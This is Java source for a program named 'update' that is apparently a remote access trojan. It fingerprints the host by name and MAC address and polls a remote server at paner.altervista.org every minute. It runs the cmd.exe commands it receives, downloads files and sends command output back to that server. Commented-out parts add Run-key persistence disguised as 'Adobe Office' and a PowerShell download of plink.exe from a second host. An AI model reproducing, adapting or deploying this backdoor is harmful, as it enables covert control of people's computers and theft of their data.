package update;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.channels.FileChannel;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
public class update{

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		String hostname="none";
		String result="";
		String output="";
		InetAddress addr;
		Runtime runtime = Runtime.getRuntime();
		
/*		File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
		File trgFile = new File(System.getProperty("user.home") + "\\update.jar");
		try{
			if(!System.getProperty("user.dir").equals(System.getProperty("user.home")))
				copyFileUsingFileChannels(srcFile,trgFile);
		}
		catch (IOException ex)
		{
			    
		}
		try{
			
			
			String value = "javaw -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
			try{
			WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe Office", value);
			}
			catch (IllegalAccessException ex)
			{
				    
			}
		}
		catch (InvocationTargetException ex)
		{
			    
		}
*/		try
		{
			addr = InetAddress.getLocalHost();
		    hostname = addr.getHostName();
		    hostname=hostname+"_"+GetNetworkAddress.GetAddress("mac");
		    
		}
		catch (UnknownHostException ex)
		{
		    System.out.println("Hostname can not be resolved");
		}
/*		try {
			
			Runtime runtime = Runtime.getRuntime();
	        String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://pannello.xoom.it/svc/plink.dat' -OutFile 'd:\\dati\\plink.exe'";
	        Process proc = runtime.exec(cmds);
		}
		catch (IOException e) {
		}
*/		//try {
	        while (true) {
	        	result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname);
	        	String[] array = result.split("\\|\\|", -1);
	        	String exec=array[6].substring(5);
	        	String cmd=array[7].substring(4);
	        	String iout=array[5].substring(5);
	        	if (exec.equals("1"))
	        	{
	        		String cmds = "cmd /C "+cmd;
	        		
	        		
	        		    array = cmd.split(" ", -1);
	        		    if (array[0].equals("getfile"))
	        		    {
	        		    	DownloadFile.GetFile(array[1], array[2]);
	        		    }
	        		    else if (iout.equals("1"))
	    	        	{
	        				output = executeCommand(cmds);
	        				output = output.replace("\'", "");
		        			output = output.replace("\\", "\\\\");
		        			output = output.replaceAll("(\r\n|\n)", "<br>");
		        			output = output.replaceAll(" ", "%20");
	        				result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&dump="+output);
	    	        	}
	        			else
	        			{
	        				try{
	        					Process proc = runtime.exec(cmds);
	        				}
		        			catch (IOException e) {
		        			}	
	        			}
	        			result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&exec=0");
	        		
	        	}	
		        try {
		        	Thread.sleep(60 * 1000);
		        }
		        catch (InterruptedException e) {
		            e.printStackTrace();
		        }
	        }
		//}
	    //catch (IOException e) {
		//}
	}
	private static void copyFileUsingFileChannels(File source, File dest)
			throws IOException {
		FileChannel inputChannel = null;
		FileChannel outputChannel = null;
		try {
			inputChannel = new FileInputStream(source).getChannel();
			outputChannel = new FileOutputStream(dest).getChannel();
			outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
		} finally {
			inputChannel.close();
			outputChannel.close();
		}
	}
	private static String executeCommand(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return output.toString();

	}
	public static String getResponseFromUrl(String surl) {
		String webPage = surl;
		String result="";
		URLConnection urlConnection;

		try{
			URL url = new URL(webPage);
			try{
				urlConnection = url.openConnection();

				InputStream is = urlConnection.getInputStream();
				InputStreamReader isr = new InputStreamReader(is);

				int numCharsRead;
				char[] charArray = new char[1024];
				StringBuffer sb = new StringBuffer();
				while ((numCharsRead = isr.read(charArray)) > 0) {
					sb.append(charArray, 0, numCharsRead);
				}
				result = sb.toString();
			}catch(IOException ex){
				//do exception handling here
			}
		}catch(MalformedURLException malex){
			//do exception handling here
		}

		return  result;
	}

}
